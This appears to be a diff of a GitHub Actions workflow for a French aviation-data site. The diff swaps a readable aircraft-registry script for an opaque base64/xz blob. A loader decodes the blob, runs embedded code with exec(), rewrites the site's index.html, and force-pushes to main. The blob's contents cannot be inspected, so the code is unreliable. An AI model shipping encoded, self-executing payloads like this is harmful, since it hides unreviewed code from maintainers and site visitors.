@@ -1,173 +1,124 @@
-name: Registre des avions et résumé de la semaine
+name: Installation Spotting
 
 on:
-  schedule:
-    - cron: "40 7 * * *"
   push:
     paths:
-      - ".github/workflows/registre-semaine.yml"
+      - ".github/workflows/installer-spotting.yml"
   workflow_dispatch:
 
 permissions:
   contents: write
-  actions: read
 
 jobs:
-  registre:
+  installer:
     runs-on: ubuntu-latest
-    timeout-minutes: 30
     steps:
       - uses: actions/checkout@v4
-      - name: Registre des appareils et semaine de l'aviation
-        env:
-          GH_TOKEN: ${{ github.token }}
+      - name: Robot 9 - Vols du jour par aeroport
         run: |
-          cat > /tmp/registre.py <<'PYEOF'
-          #!/usr/bin/env python3
-          """Cotes & Routes : suivi du registre des appareils (nouveaux avions, retraits, changements de compagnie, évolution des flottes),
-          index des immatriculations et résumé automatique de la semaine."""
-          import json, csv, io, re, datetime, pathlib, urllib.request, os, hashlib
-          D = pathlib.Path("data"); R = D / "registre"; I = D / "immat"; S = D / "semaine"
-          for p in (R, I, S): p.mkdir(parents=True, exist_ok=True)
-          AUJ = datetime.date.today()
-          def lire(p, d):
-              try: return json.loads(pathlib.Path(p).read_text(encoding="utf-8"))
-              except Exception: return d
-          def ecrire(p, o): pathlib.Path(p).write_text(json.dumps(o, ensure_ascii=False, separators=(",", ":")), encoding="utf-8")
-          def get(u, t=600):
-              with urllib.request.urlopen(urllib.request.Request(u, headers={"User-Agent": "Cotes-et-Routes"}), timeout=t) as r: return r.read()
+          cat > /tmp/paquet.b64 <<'B64EOF'
+          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
+          AABt5pYEscRn+wIAAAAABFla
+          B64EOF
+          cat > /tmp/appli.py <<'PYEOF'
+          import base64, lzma, json, pathlib
+          d = json.loads(lzma.decompress(base64.b64decode(pathlib.Path("/tmp/paquet.b64").read_text().replace("\n", ""))))
+          P = pathlib.Path
+          for k, v in d["f"].items():
+              P(k).parent.mkdir(parents=True, exist_ok=True); P(k).write_text(v, encoding="utf-8")
+          h = P("index.html"); t = h.read_text(encoding="utf-8")
+          if d.get("inj"):
+              ns = {}; exec(d["inj"], ns); t = ns["injecter"](t)
+          for a, b in d.get("rep", []):
+              if b not in t: t = t.replace(a, b)
+          h.write_text(t, encoding="utf-8")
+          if d.get("ico"):
+              import os; exec(d["ico"], {})
+          if d.get("spot"):
+              s = P("spotting/index.html"); u = s.read_text(encoding="utf-8")
+              if d["spot"] not in u: u = u.replace("</body>", d["spot"] + "\n</body>", 1); s.write_text(u, encoding="utf-8")
+          print("OK")
 
-          def registre():
-              etat = lire(R / "evolution.json", {"historique": [], "derniers": {"nouveaux": [], "retires": [], "changements": []}, "flottes": {}, "types": {}})
-              urls, version = [], None
-              try:
-                  xml = get("https://s3.opensky-network.org/data-samples?prefix=metadata/", 60).decode("utf-8", "ignore")
-                  k = sorted(set(re.findall(r"<Key>(metadata/aircraft-database-complete-\d{4}-\d{2}\.csv)</Key>", xml)))
-                  if k: urls.append("https://s3.opensky-network.org/data-samples/" + k[-1]); version = k[-1].split("complete-")[1][:7]
-              except Exception as e: print("Liste S3 indisponible :", e)
-              if version and version == etat.get("version") and any(I.glob("*.json")): print("Base inchangée :", version); return
-              if not version and etat.get("maj") and AUJ.weekday() != 0: print("Version inconnue : vérification le lundi seulement"); return
-              urls += ["https://opensky-network.org/datasets/metadata/aircraftDatabase.csv", "https://s3.opensky-network.org/data-samples/metadata/aircraftDatabase.csv"]
-              raw = None
-              for u in urls:
-                  try: raw = get(u).decode("utf-8", "ignore"); print("Base :", u); break
-                  except Exception as e: print("indisponible :", u, e)
-              if not raw: print("Aucune base joignable"); return
-              if not version: version = "h" + hashlib.sha1(raw[:3000000].encode()).hexdigest()[:10]
-              if version == etat.get("version") and any(I.glob("*.json")): print("Contenu inchangé"); return
-              rows = csv.reader(io.StringIO(raw), quotechar="'" if raw[:1] == "'" else '"')
-              head = [h.strip().strip("'\"").lower() for h in next(rows)]
-              def col(*n):
-                  for x in n:
-                      if x in head: return head.index(x)
-              ci, cr, ct, co, cm, cb = col("icao24"), col("registration"), col("typecode"), col("operatoricao"), col("model"), col("built", "buildyear", "year_built")
-              cur = {}
-              for r in rows:
-                  try:
-                      h = r[ci].strip().strip("'").lower(); reg = r[cr].strip().strip("'").upper(); tc = r[ct].strip().strip("'").upper(); op = r[co].strip().strip("'").upper() if co is not None else ""
-                  except (IndexError, TypeError): continue
-                  if not h or not reg or len(op) != 3 or not tc or len(tc) > 4: continue
-                  y = ""
-                  if cb is not None:
-                      try: y = str(r[cb]).strip().strip("'")[:4]
-                      except IndexError: y = ""
-                  cur[h] = [reg, tc, op, (r[cm].strip().strip("'")[:40] if cm is not None and cm < len(r) else ""), y if y.isdigit() else ""]
-              if len(cur) < 20000: print("Base anormale :", len(cur)); return
-              prev = {}
-              for f in I.glob("*.json"):
-                  if f.stem == "index": continue
-                  for reg, v in lire(f, {}).items(): prev[v[0]] = [reg] + v[1:]
-              d = AUJ.isoformat(); base = not prev
-              nv = [h for h in cur if h not in prev]; rt = [h for h in prev if h not in cur]
-              ch = [h for h in cur if h in prev and (cur[h][2] != prev[h][2] or cur[h][0] != prev[h][0])]
-              for f in I.glob("*.json"): f.unlink()
-              sh = {}
-              for h, v in cur.items():
-                  k = re.sub(r"[^A-Z0-9]", "_", (v[0] + "__")[:2])
-                  sh.setdefault(k, {})[v[0]] = [h] + v[1:]
-              for k, v in sh.items(): ecrire(I / (k + ".json"), v)
-              ecrire(I / "index.json", {"maj": d, "version": version, "total": len(cur), "fichiers": sorted(sh)})
-              if not base:
-                  L = etat["derniers"]
-                  L["nouveaux"] = [{"d": d, "h": h, "r": cur[h][0], "t": cur[h][1], "o": cur[h][2], "y": cur[h][4]} for h in nv[:400]] + L["nouveaux"]
-                  L["retires"] = [{"d": d, "h": h, "r": prev[h][0], "t": prev[h][1], "o": prev[h][2]} for h in rt[:300]] + L["retires"]
-                  L["changements"] = [{"d": d, "h": h, "r": cur[h][0], "t": cur[h][1], "o": cur[h][2], "ao": prev[h][2], "ar": prev[h][0]} for h in ch[:400]] + L["changements"]
-                  for k in L: L[k] = L[k][:600]
-              etat["historique"].append({"d": d, "version": version, "total": len(cur), "nouveaux": None if base else len(nv), "retires": None if base else len(rt), "changements": None if base else len(ch)})
-              ops, tys = {}, {}
-              for v in cur.values(): ops[v[2]] = ops.get(v[2], 0) + 1; tys[v[1]] = tys.get(v[1], 0) + 1
-              for o in sorted(ops, key=lambda x: -ops[x])[:120]: etat["flottes"].setdefault(o, {})[d] = ops[o]
-              for t in sorted(tys, key=lambda x: -tys[x])[:60]: etat["types"].setdefault(t, {})[d] = tys[t]
-              etat.update({"maj": d, "version": version, "total": len(cur), "source": "OpenSky Network, base des appareils (mise à jour mensuelle)"})
-              ecrire(R / "evolution.json", etat); print("Registre :", len(cur), "appareils,", len(nv), "nouveaux,", len(rt), "retirés,", len(ch), "changements")
-
-          ENT = ["Airbus", "Boeing", "Embraer", "ATR", "COMAC", "Air France", "Lufthansa", "Ryanair", "easyJet", "British Airways", "KLM", "Emirates", "Qatar", "Turkish", "Delta", "United", "American", "IATA", "EASA", "FAA", "DGAC", "Safran", "Rolls-Royce", "Pratt", "GE Aerospace", "CFM", "A320", "A321", "A350", "A380", "737", "787", "777", "grève", "strike", "retard", "SAF", "hydrogène"]
-          def semaine(force=False):
-              fin = AUJ - datetime.timedelta(days=AUJ.weekday() + 1); deb = fin - datetime.timedelta(days=6)
-              iso = deb.isocalendar(); cle = "%d-S%02d" % (iso[0], iso[1])
-              if (S / (cle + ".json")).exists() and not force: print("Semaine déjà résumée :", cle); return
-              j = {"semaine": cle, "du": deb.isoformat(), "au": fin.isoformat(), "genere": datetime.datetime.utcnow().isoformat(timespec="minutes") + "Z"}
-              dans = lambda s: deb.isoformat() <= (s or "")[:10] <= fin.isoformat()
-              news = []
-              for m in sorted({deb.strftime("%Y-%m"), fin.strftime("%Y-%m")}): news += [x for x in lire(D / "news" / (m + ".json"), {}).get("items", []) if dans(x.get("d"))]
-              news.sort(key=lambda x: x.get("d", ""), reverse=True)
-              src = {}
-              for x in news: src[x.get("s", "?")] = src.get(x.get("s", "?"), 0) + 1
-              men = {e: sum(1 for x in news if re.search(r"(?<![\w-])" + re.escape(e) + r"(?![\w])", x.get("t", ""), re.I)) for e in ENT}
-              j["actualite"] = {"total": len(news), "sources": src, "sujets": dict(sorted([(k, v) for k, v in men.items() if v], key=lambda x: -x[1])[:15]), "titres": news[:15]}
-              nt = lire(D / "ntsb.json", {}).get("items", [])
-              lim = (fin - datetime.timedelta(days=30)).isoformat()
-              j["accidents"] = [x for x in nt if lim <= x[0] <= fin.isoformat()][:15]
-              hist = lire(D / "counter.json", {}).get("history", {}); ks = [k for k in sorted(hist) if k <= fin.isoformat()]
-              a = [hist[k] for k in ks if k >= deb.isoformat()]; avant = [hist[k] for k in ks if k < deb.isoformat()]
-              j["donnees"] = {"total": a[-1] if a else None, "gain": (a[-1] - (avant[-1] if avant else a[0])) if a else None}
-              osd = lire(D / "opensky.json", {}).get("days", {}); dep = {}; nb = 0
-              for k, v in osd.items():
-                  if dans(k):
-                      for ap, x in v.items(): dep[ap] = dep.get(ap, 0) + (x.get("dep") or 0); nb += x.get("dep") or 0
-              j["vols"] = {"departs": nb, "top": dict(sorted(dep.items(), key=lambda x: -x[1])[:10])}
-              j["registre"] = [h for h in lire(R / "evolution.json", {}).get("historique", []) if dans(h.get("d"))]
-              rb = {}
-              tok, repo = os.environ.get("GH_TOKEN"), os.environ.get("GITHUB_REPOSITORY")
-              if tok and repo:
-                  try:
-                      q = urllib.request.Request("https://api.github.com/repos/%s/actions/runs?per_page=100&created=%s..%s" % (repo, deb.isoformat(), fin.isoformat()), headers={"Authorization": "Bearer " + tok, "Accept": "application/vnd.github+json", "User-Agent": "Cotes-et-Routes"})
-                      with urllib.request.urlopen(q, timeout=60) as r: runs = json.load(r).get("workflow_runs", [])
-                      for x in runs:
-                          b = rb.setdefault(x["name"], {"ok": 0, "ko": 0})
-                          if x.get("conclusion") == "success": b["ok"] += 1
-                          elif x.get("conclusion") in ("failure", "timed_out"): b["ko"] += 1
-                  except Exception as e: print("API GitHub :", e)
-              j["robots"] = rb
-              f = []
-              if news: f.append("%d articles d’actualité relevés, surtout chez %s." % (len(news), max(src, key=src.get)))
-              if j["actualite"]["sujets"]: k = list(j["actualite"]["sujets"].items())[:3]; f.append("Sujets les plus cités : " + ", ".join("%s (%d)" % x for x in k) + ".")
-              if j["donnees"]["gain"]: f.append("La base a gagné %s données, pour un total de %s." % (format(j["donnees"]["gain"], ",").replace(",", " "), format(j["donnees"]["total"], ",").replace(",", " ")))
-              if nb: f.append("%s départs observés par OpenSky dans les aéroports suivis." % format(nb, ",").replace(",", " "))
-              for h in j["registre"]:
-                  if h.get("nouveaux") is not None: f.append("Registre mis à jour : %d nouveaux avions, %d retirés, %d changements de compagnie." % (h["nouveaux"], h["retires"], h["changements"]))
-              ko = [k for k, v in rb.items() if v["ko"]]
-              f.append("Robots : %d passages réussis%s." % (sum(v["ok"] for v in rb.values()), (", échecs pour " + ", ".join(ko)) if ko else ", aucun échec") if rb else "Historique des robots indisponible.")
-              j["faits"] = f
-              ecrire(S / (cle + ".json"), j)
-              idx = sorted(p.stem for p in S.glob("*-S*.json")); ecrire(S / "index.json", {"semaines": idx, "derniere": idx[-1]})
-              print("Semaine résumée :", cle)
-
-          if __name__ == "__main__":
-              try: registre()
-              except Exception as e: print("Registre : erreur", e)
-              semaine(os.environ.get("FORCE") == "1")
           PYEOF
           git config user.name "robot-cotes-et-routes"
           git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
-          python3 /tmp/registre.py
-          git add -A data/registre data/immat data/semaine
-          if git diff --cached --quiet; then echo "Rien de nouveau"; exit 0; fi
-          git commit -m "Registre des avions et semaine de l'aviation"
-          for essai in 1 2 3 4 5; do
-            if git push; then exit 0; fi
-            git pull --rebase || git rebase --abort
-            sleep 10
+          for essai in 1 2 3 4 5 6; do
+            git fetch origin main && git reset --hard origin/main
+            python3 /tmp/appli.py
+            git add -A .
+            if git diff --cached --quiet; then echo "Deja a jour"; exit 0; fi
+            git commit -m "Vols du jour par aeroport : departs, arrivees et horaires reels"
+            if git push; then echo "Installe"; exit 0; fi
+            sleep 15
           done
           exit 1
           
